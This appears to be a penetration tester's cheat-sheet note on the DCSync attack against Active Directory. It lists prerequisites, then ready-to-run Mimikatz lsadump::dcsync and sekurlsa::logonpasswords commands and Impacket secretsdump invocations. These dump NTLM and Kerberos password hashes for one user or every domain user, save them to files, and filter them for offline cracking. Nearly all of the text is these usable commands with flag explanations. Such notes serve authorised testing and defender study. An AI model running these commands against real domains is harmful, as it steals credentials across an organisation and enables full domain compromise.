#AD #Attack
## Info

- **Type:** Privilege Escalation / Active Directory Enumeration Attack    
- **Common Usage:** Used to extract password hashes (NTLM, Kerberos) from the domain controller without needing to directly access the domain controller.
- **Used By:** Attackers with sufficient permissions (Domain Admin or Enterprise Admin) to impersonate a domain controller.
- **Security Note:** Can be used to **dump credentials** for offline cracking, leading to full compromise of user accounts, especially **Domain Admins**.
## Prerequisites

- **Required Permissions:** The attacker must have **Domain Admin** or **Enterprise Admin** privileges, or **Replication rights** on the target domain controller.
- **Tools:**
    - **Mimikatz** (Most commonly used tool)
    - **[[Impacket]]'s `secretsdump.py`** (an alternative method)
## Mimikatz

### Run Mimikatz

```bash
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "lsadump::dcsync /user:$TARGET_USER /domain:$DOMAIN /sid:$DOMAIN_SID"
```

- `privilege::debug`: Ensure you have high enough privileges to perform the attack.
- `sekurlsa::logonpasswords`: Displays current session's logon information (passwords, hashes).
- `lsadump::dcsync`: Simulates domain controller replication to dump the hashes of a specified user.
- `/user`: The target user whose hash you wish to extract.
- `/domain`: The domain name of the target.
- `/sid`: The SID of the domain (can be found using `net user /domain` or through `rpcclient`).

### Extract All User Hashes
```bash
mimikatz "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /all"
```

- `all`: Fetches the hashes for **all users** in the domain.
### Target a Specific Domain Controller

```bash
mimikatz "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /controller:$DC_IP"
```

- `/controller`: Specifies the domain controller to sync with for hashes.
## Impacket's `secretsdump`
### Basic Usage

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP -just-dc-user $TARGET_USER
```

- `$DOMAIN/$USER:$PASSWORD`: The attacker’s credentials (could also use NTLM hash).    
- `@$IP`: The target domain controller.
- `-just-dc-user`: Dumps only the specific target user's hash from the domain controller.

#### Extract All User Hashes

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP -outputfile hashes.txt
```

- This command will dump all user hashes from the domain controller. 
## Advanced Usage

### Save Output to File

```bash
mimikatz "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /user:$USER /sid:$DOMAIN_SID" > hashes.txt
```
### Extract NTLM Hash for Further Cracking

```bash
mimikatz "privilege::debug" "lsadump::dcsync /user:$USER /domain:$DOMAIN" | grep -i "NTLM"
```

- This command filters the output to only show NTLM hashes.
### Impacket `secretsdump.py`

```bash
secretsdump.py -just-dc-user $TARGET_USER $DOMAIN/$USER:$PASSWORD@$IP
```

- This will extract the hashes of the specific user from the domain controller.